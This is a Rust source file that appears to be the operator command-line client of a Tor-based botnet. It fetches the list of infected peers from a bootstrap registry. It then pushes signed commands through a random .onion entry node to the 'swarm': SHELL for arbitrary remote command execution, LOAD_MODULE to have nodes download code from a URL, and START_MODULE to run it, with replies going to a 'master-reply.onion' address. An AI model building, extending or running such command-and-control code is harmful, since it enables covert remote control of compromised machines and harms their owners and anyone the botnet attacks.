use std::path::PathBuf;
use crate::crypto;
use crate::network::GhostClient;
use tokio_tungstenite::MaybeTlsStream;
use tokio::net::TcpStream;
use tokio_socks::tcp::Socks5Stream;

pub async fn handle_keygen(output: PathBuf) {
    let pub_key = crypto::generate_key(&output);
    println!("Generated Key at: {}", output.display());
    println!("Public Key: {}", pub_key);
}

pub async fn handle_list(bootstrap: String) {
    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Failed to connect to Bootstrap: {}", e);
            return;
        }
    };
    
    // In Mesh, we ask Bootstrap for peers
    use protocol::PeerInfo;
    match client.get_peers().await {
        Ok(peers) => {
             println!("Bootstrap Registry ({})", peers.len());
             for (i, p) in peers.iter().enumerate() {
                 println!("{}. {} ({})", i+1, p.pub_key, p.onion_address);
             }
        }
        Err(e) => eprintln!("Error fetching peers: {}", e),
    }
}

pub async fn handle_target(_bootstrap: String, _key: PathBuf, _target: String, _cmd: String) {
    println!("Direct targeting in Mesh requires connecting to specific .onion. Not implemented in this CLI yet.");
}

pub async fn handle_load_module(bootstrap: String, key_path: PathBuf, url: String, name: String) {
    let cmd = format!("LOAD_MODULE|{}|{}", url, name); // Helper to pack args into payload
    // Re-use broadcast logic but with specific action
    handle_broadcast_custom(bootstrap, key_path, "LOAD_MODULE".to_string(), format!("{}|{}", url, name)).await;
}

pub async fn handle_start_module(bootstrap: String, key_path: PathBuf, name: String, args: String) {
    handle_broadcast_custom(bootstrap, key_path, "START_MODULE".to_string(), format!("{}|{}", name, args)).await;
}

// Refactor handle_broadcast to be generic wrapper
pub async fn handle_broadcast(bootstrap: String, key_path: PathBuf, cmd: String) {
    // Default to OLD broadcast which assumed "Command String" was for generic execution or legacy
    // For now, let's treat "cmd" as raw parameters for a default action, or just use KILL_BOT
    // But to keep existing functionality:
    println!("Broadcast Generic: {}", cmd);
    // Let's assume generic broadcast is just sending a raw action/param via some syntax, 
    // OR we map "cmd" => Action: "SHELL", Params: cmd.
    
    // For this refactor, let's keep it simple: handle_broadcast wraps custom with fixed ID
    handle_broadcast_custom(bootstrap, key_path, "SHELL".to_string(), cmd).await;
}

pub async fn handle_broadcast_custom(bootstrap: String, key_path: PathBuf, action: String, params: String) {
    let key = crypto::load_key(&key_path);
    
    // 1. Connect to Bootstrap
    let mut client = match GhostClient::<MaybeTlsStream<TcpStream>>::connect(&bootstrap).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Conn Error: {}", e);
            return;
        }
    };
    
    let peers = match client.get_peers().await {
        Ok(p) => p,
        Err(e) => {
            eprintln!("Failed to get peers: {}", e);
            return;
        }
    };
    
    if peers.is_empty() {
        println!("No nodes found.");
        return;
    }
    
    // 2. Pick Random Entry Node
    use rand::seq::SliceRandom;
    let entry = peers.choose(&mut rand::thread_rng()).unwrap();
    println!("Selected Entry: {}", entry.onion_address);
    drop(client);
    
    // 3. Connect via Tor
    let proxy_addr = "127.0.0.1:9050";
    let mut node_client = match GhostClient::<Socks5Stream<TcpStream>>::connect_via_tor(&entry.onion_address, 80, proxy_addr).await {
        Ok(c) => c,
        Err(e) => {
            eprintln!("Tor Conn Error: {}", e);
            return;
        }
    };
    
    let session_key = match node_client.handshake().await {
        Ok(k) => k,
        Err(e) => { eprintln!("Handshake Error: {}", e); return; }
    };
    
    // 4. Create Custom Payload
    use protocol::CommandPayload;
    let payload = CommandPayload {
        id: uuid::Uuid::new_v4().to_string(),
        action,
        parameters: params,
        execute_at: chrono::Utc::now().timestamp(), // Immediate
        reply_to: Some(format!("master-reply.onion")), // Placeholder
    };

    if let Err(e) = node_client.inject_command(payload, &key, &session_key).await {
        eprintln!("Injection Failed: {}", e);
    } else {
        println!("Command Injected into Swarm.");
    }
}
